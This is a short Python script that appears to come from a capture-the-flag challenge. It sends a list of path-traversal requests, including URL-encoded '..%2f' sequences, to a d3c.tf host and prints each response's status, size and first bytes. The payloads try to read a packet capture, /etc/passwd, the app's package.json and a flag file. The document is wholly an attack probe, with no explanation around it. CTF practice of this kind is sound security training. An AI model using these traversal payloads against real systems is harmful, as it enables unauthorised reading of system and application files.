import requests

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

test_paths = [
    "/test/7f9c18a2e44d/..",
    "/test/7f9c18a2e44d/.",
    "/test/7f9c18a2e44d/../5d0185499f64d3116843ddcb3dd16344.pcap",
    "/test/7f9c18a2e44d/..%2f5d0185499f64d3116843ddcb3dd16344.pcap",
    "/test/..%2f7f9c18a2e44d%2f5d0185499f64d3116843ddcb3dd16344.pcap",
    "/test/..%2f..%2f..%2fetc%2fpasswd",
    "/test/..%2f..%2f..%2fapp%2fpackage.json",
    "/test/7f9c18a2e44d/..%2f..%2f..%2fetc%2fpasswd",
    "/test/7f9c18a2e44d/..%2f..%2f..%2fapp%2fpackage.json",
    "/test/7f9c18a2e44d/..%2f..%2f..%2fflag",
    "/test/7f9c18a2e44d/..%2f..%2f..%2fflag.txt",
]

for p in test_paths:
    r = requests.get(f"{base}{p}")
    print(f"{p:60s} -> {r.status_code} ({len(r.content)}B) | {repr(r.content[:50])}")
